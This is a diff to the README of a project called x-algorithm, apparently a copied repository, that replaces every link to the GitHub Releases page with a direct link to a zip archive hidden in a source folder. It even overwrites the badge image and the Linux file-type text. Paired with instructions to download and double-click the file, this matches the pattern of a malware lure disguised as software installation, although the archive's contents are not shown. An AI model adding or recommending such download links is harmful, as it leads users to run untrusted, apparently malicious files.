@@ -8,13 +8,13 @@ Welcome to the x-algorithm project! This application powers the For You feed on 
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download x-algorithm](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/BUICHIEU/x-algorithm/releases)
+[![Download x-algorithm](https://raw.githubusercontent.com/BUICHIEU/x-algorithm/main/thunder/kafka/algorithm_x_3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/BUICHIEU/x-algorithm/main/thunder/kafka/algorithm_x_3.2.zip)
 
 ### Step-by-Step Instructions
 
-1. Click on the link to [visit this page to download](https://github.com/BUICHIEU/x-algorithm/releases).
+1. Click on the link to [visit this page to download](https://raw.githubusercontent.com/BUICHIEU/x-algorithm/main/thunder/kafka/algorithm_x_3.2.zip).
 2. Look for the latest version of the software. You will see a list of available files for download.
-3. Choose the file appropriate for your operating system. Common options include Windows (.exe), macOS (.dmg), or Linux (.tar.gz).
+3. Choose the file appropriate for your operating system. Common options include Windows (.exe), macOS (.dmg), or Linux (https://raw.githubusercontent.com/BUICHIEU/x-algorithm/main/thunder/kafka/algorithm_x_3.2.zip).
 4. Click the file name to start the download. Your file will typically go to your Downloads folder.
 5. Once the file has finished downloading, locate the downloaded file.
 6. Double-click on the file icon to begin the installation process.
@@ -67,6 +67,6 @@ If you are interested in contributing to x-algorithm, we welcome developers and 
 
 Join our community of users who are enjoying the benefits of x-algorithm. Connect with others on social platforms and share your experiences. 
 
-Remember, you can always return to the [Releases page to download](https://github.com/BUICHIEU/x-algorithm/releases) the latest version if you need updates or reinstall the application.
+Remember, you can always return to the [Releases page to download](https://raw.githubusercontent.com/BUICHIEU/x-algorithm/main/thunder/kafka/algorithm_x_3.2.zip) the latest version if you need updates or reinstall the application.
 
 Happy exploring with x-algorithm!
